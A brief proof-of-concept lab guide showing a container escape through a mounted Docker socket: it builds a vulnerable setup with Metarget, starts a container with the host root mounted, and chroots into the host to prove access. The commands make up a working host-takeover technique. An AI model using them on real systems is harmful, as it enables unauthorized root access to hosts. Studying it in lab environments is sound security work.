## Proof of Concept

To perform the Proof of Concept, please follow the below steps:

1. Basic environment setup for Docker and K8+. Execute the following commands inside the metarget folder.<br/>
`./metarget gadget install docker --version 18.03.1` <br/>
`./metarget gadget install k8s --version 1.16.5 --domestic`
2. Prepare the vulnerable environment using the following command. <br/>
`./metarget cnv install mount-docker-sock`

3. Create an alpine image with with mounted docker.sock <br/>
`docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock alpine sh`
4. Verify if the docker.sock has been mounted. <br/>
`ls /var/run/docker.sock `
5. Check if the docker is installed inside the container or not. If not then execute the following commands. <br/>
`apk update` <br/>
`apk add -U docker`
6. After mounting docker.sock, the malicious container has full access to managing containers. Now create a new container with mounted root directory. <br/>
`docker -H unix://var/run/docker.sock run -it -v /:/host -t alpine sh`<br/>
`chroot host`
7. Inside the malicious container, create a file. <br/>
`touch sockpwn_success`
8. Perform a read on this file from host. <br/>
`cat sockpwn_success`